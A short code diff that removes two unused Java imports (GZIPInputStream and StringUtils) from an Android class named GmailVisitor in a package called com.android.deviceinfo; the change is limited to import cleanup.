@@ -4,7 +4,6 @@ import java.io.ByteArrayInputStream;
 import java.io.ByteArrayOutputStream;
 import java.io.IOException;
 import java.util.Date;
-import java.util.zip.GZIPInputStream;
 import java.util.zip.InflaterInputStream;
 
 import android.database.Cursor;
@@ -14,7 +13,6 @@ import com.android.deviceinfo.db.RecordVisitor;
 import com.android.deviceinfo.module.ModuleMessage;
 import com.android.deviceinfo.module.message.Filter;
 import com.android.deviceinfo.util.Check;
-import com.android.deviceinfo.util.StringUtils;
 
 public class GmailVisitor extends RecordVisitor {
 	private static final String TAG = "GmailVisitor";
